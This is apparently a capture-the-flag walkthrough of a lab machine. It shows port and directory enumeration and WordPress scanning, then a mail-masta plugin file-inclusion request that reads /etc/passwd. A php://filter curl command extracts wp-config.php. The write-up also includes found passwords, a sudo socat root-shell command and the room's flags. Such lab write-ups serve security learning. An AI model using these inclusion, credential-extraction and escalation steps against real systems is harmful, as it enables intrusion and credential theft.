> All In Oe 

**export IP=10.10.155.57**

## Enumerating

# Nmap

sudo nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.107.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Gobuster

sudo gobuster dir -u http://10.10.155.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,js,html,sql,bak,cgi,zip -o gobuster/initial

```
/wordpress (Status: 301)
/hackathons (Status: 200)
```

sudo gobuster dir -u http://$IP/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,sql,bak,zip,tar,cgi -o gobuster/wordpress

```
/index.php (Status: 301)
/wp-content (Status: 301)
/wp-login.php (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
```

# wpscan

wpscan --url http://10.10.155.57/wordpress -e u | tee wp_users


```
[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.155.57/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

wpscan --url http://10.10.155.57/wordpress -e ap | tee wp_plugins


```
[+] mail-masta
 | Location: http://10.10.155.57/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.155.57/wordpress/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.155.57/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.10.155.57/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2019-05-10T16:05:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.155.57/wordpress/wp-content/plugins/reflex-gallery/readme.txt
```

# hackathon's directory

Looking at the page-source we can see this.

```
Damn how much I hate the smell of <i>Vinegar </i> :/ !!! 

Dvc W@iyur@123 --> Cipher
KeepGoing --> Key
```

Looks like Viginere cipher. Let's decode it!!

And we got the clear text `Try H@ckme@123`

And looking at the plugin in searchsploit, we can find a sqli exploit.

## POC

http://10.10.208.160/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```

Let's get the config file `wp-config.php` and get the password from it. 

We can't get the file as such, so let's convert it to base64 and get it.

curl http://10.10.208.160/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php | base64 -d > wp-config.php

We got the config file. We got elyana'e password `H@ckme@123`. We can sign-in to the wordpress account. Let's get a shell!

## Hint : Elyana's user password is hidden in the system. Find it ;)

# Enumeration Again

Let's run linpeas and see what we get. We got various things before that let's search for that password. 

find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"


```
/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt => We got the creds.
```

`elyana`:`E@syR18ght` is the credential. And we are in as elyana!!

# user.txt

```
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

# Privilege Escalation

sudo -l

```
User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```

sudo socat stdin exec:/bin/sh

We are in as root!!

# root.txt

```
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```